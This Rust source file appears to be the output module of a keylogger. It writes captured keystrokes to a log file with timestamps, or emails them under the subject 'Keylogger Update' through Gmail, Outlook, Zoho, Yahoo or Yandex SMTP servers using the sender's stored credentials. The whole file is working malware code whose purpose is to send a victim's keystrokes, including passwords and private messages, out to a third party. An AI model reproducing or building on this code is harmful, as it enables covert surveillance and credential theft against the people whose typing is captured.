use chrono::Local;
use lettre::message::{header, Message};
use lettre::transport::smtp::authentication::Credentials;
use lettre::{SmtpTransport, Transport};

use std::fs::OpenOptions;
use std::io::Write;
use std::io::{Error, ErrorKind, Result};

pub enum Method {
    File {
        path: String,
    },
    Email {
        email: String,
        password: String,
        recipient: String,
    },
}

impl Method {
    pub fn handle(&self, keys: &[String]) -> Result<()> {
        match self {
            Method::File { path } => {
                let mut file = OpenOptions::new().append(true).create(true).open(path)?;
                writeln!(
                    file,
                    "--------- {} ---------\n{}",
                    Local::now(),
                    keys.join("")
                )?;
            }
            Method::Email {
                email,
                password,
                recipient,
            } => {
                let email_packet = Message::builder()
                    .from(email.parse().unwrap())
                    .to(recipient.parse().unwrap())
                    .subject("Keylogger Update".to_string())
                    .header(header::ContentType::TEXT_PLAIN) // TEXT_HTML for HTML message
                    .body(format!(
                        "----------- {} -----------\n{}",
                        Local::now(),
                        keys.join("")
                    ))
                    .unwrap();
                let credentials = Credentials::new(email.to_string(), password.to_string());
                let smtp_server: String = if email.contains("@gmail.com") {
                    "smtp.gmail.com".to_string()
                } else if email.contains("@outlook.com") || email.contains("@hotmail.com") {
                    "smtp-mail.outlook.com".to_string()
                } else if email.contains("@zoho.com") {
                    "smtp.zoho.com".to_string()
                } else if email.contains("@yahoo.com") {
                    "smtp.mail.yahoo.com".to_string()
                } else if email.contains("@yandex.com") {
                    "smtp.yandex.com".to_string()
                } else {
                    return Err(Error::new(
                        ErrorKind::Other,
                        "Email domain is not currently supported",
                    ));
                };
                let mailer = SmtpTransport::relay(&smtp_server)
                    .unwrap()
                    //.port(port)
                    .credentials(credentials)
                    .build();
                mailer.send(&email_packet).unwrap();
            }
        }
        Ok(())
    }
}
